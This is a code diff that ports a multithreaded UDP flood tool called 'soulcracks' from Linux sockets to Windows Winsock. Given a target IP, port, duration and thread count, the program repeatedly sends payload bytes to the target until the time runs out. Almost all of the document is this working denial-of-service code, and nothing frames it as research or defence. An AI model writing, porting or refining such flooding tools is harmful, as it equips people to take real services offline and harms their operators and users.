@@ -1,13 +1,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <arpa/inet.h>
+#include <winsock2.h>
+#include <windows.h>
 #include <pthread.h>
 #include <time.h>
 
+#pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library
+
 void usage() {
-    printf("Usage: ./soulcracks ip port time threads\n");
+    printf("Usage: soulcracks ip port time threads\n");
     exit(1);
 }
 
@@ -19,7 +21,7 @@ struct thread_data {
 
 void *attack(void *arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    int sock;
+    SOCKET sock;
     struct sockaddr_in server_addr;
     time_t endtime;
 
@@ -27,8 +29,18 @@ void *attack(void *arg) {
         "\xd9\x00",
     };
 
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+    // Initialize Winsock
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
+        pthread_exit(NULL);
+    }
+
+    // Create socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock == INVALID_SOCKET) {
         perror("Socket creation failed");
+        WSACleanup();
         pthread_exit(NULL);
     }
 
@@ -41,16 +53,17 @@ void *attack(void *arg) {
 
     while (time(NULL) <= endtime) {
         for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
-            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
-                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            if (sendto(sock, payloads[i], strlen(payloads[i]), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
                 perror("Send failed");
-                close(sock);
+                closesocket(sock);
+                WSACleanup();
                 pthread_exit(NULL);
             }
         }
     }
 
-    close(sock);
+    closesocket(sock);
+    WSACleanup();
     pthread_exit(NULL);
 }
 
@@ -66,15 +79,11 @@ int main(int argc, char *argv[]) {
 
     pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
 
-   // printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
-
     for (int i = 0; i < threads; i++) {
-
         struct thread_data *data = malloc(sizeof(struct thread_data));
         data->ip = ip;
         data->port = port;
         data->time = time;
-
 
         if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
             perror("Thread creation failed");
@@ -82,7 +91,6 @@ int main(int argc, char *argv[]) {
             free(thread_ids);
             exit(1);
         }
-    //    printf("Launched thread with ID: %lu\n", thread_ids[i]);
     }
 
     for (int i = 0; i < threads; i++) {
